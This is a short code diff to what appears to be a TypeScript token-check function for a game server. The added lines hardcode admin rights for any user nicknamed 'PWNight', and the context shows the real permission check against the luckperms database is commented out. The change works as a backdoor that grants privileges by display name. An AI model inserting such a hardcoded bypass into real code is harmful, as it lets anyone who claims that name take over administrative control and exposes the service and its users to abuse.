@@ -24,6 +24,9 @@ async function checkToken(token: any){
         const { premium_uuid, joined, last_seen } = user;
 
         let hasAdmin = false;
+        if ( profile.nick == 'PWNight'){
+            hasAdmin = true;
+        }
         /*const [adminPermission] : any = await permsQuery("SELECT * FROM `luckperms_user_permissions` WHERE uuid = ? AND (permission = 'group.staff' OR permission = 'group.dev');", [profile.fk_uuid])
         if ( adminPermission ){
             hasAdmin = true;
